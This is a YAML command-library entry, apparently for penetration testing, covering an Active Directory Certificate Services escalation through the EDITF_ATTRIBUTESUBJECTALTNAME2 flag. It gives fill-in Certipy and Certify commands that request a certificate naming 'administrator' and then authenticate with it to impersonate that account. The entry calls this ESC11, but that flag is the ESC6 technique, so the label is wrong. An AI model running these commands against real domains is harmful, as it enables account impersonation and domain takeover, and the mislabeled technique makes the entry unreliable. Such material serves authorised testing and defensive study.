name: ADCSESC11
description: |
  ESC11 occurs when EDITF_ATTRIBUTESUBJECTALTNAME2 flag is enabled on the CA,
  allowing requesters to specify an arbitrary Subject Alternative Name (SAN)
  in certificate requests. This can be used to impersonate any user.

commands:
  - tool: Certipy
    description: Request certificate with arbitrary SAN
    command: |
      certipy req -u '<YOUR_USER>@<DOMAIN>' -p '<YOUR_PASSWORD>' \
        -ca '<CA_NAME>' -target '<DC_IP>' \
        -template 'User' -upn 'administrator@<DOMAIN>'

  - tool: Certipy
    description: Authenticate as administrator
    command: |
      certipy auth -pfx 'administrator.pfx' -dc-ip '<DC_IP>'

  - tool: Certify (Windows)
    description: Request certificate with SAN using Certify
    command: |
      Certify.exe request /ca:<CA_NAME> /template:User /altname:administrator

references:
  - https://posts.specterops.io/certified-pre-owned-d95910965cd2
